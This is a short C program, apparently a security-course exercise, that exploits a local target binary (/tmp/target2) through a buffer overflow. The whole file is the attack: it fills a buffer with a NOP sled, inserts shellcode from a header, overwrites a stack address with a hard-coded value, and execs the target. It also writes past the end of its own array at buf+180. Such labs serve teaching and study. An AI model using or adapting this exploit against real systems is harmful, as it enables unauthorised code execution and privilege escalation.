#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[181];

  int i;
  for (i=0; i < 181; i++) {
    buf[i] = 0x90;
  }

  strncpy(buf+131, shellcode, 45);
  *((int*)(buf + 176)) = 0xbffffcf4;
  *((int*)(buf + 180)) = 0xa0;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
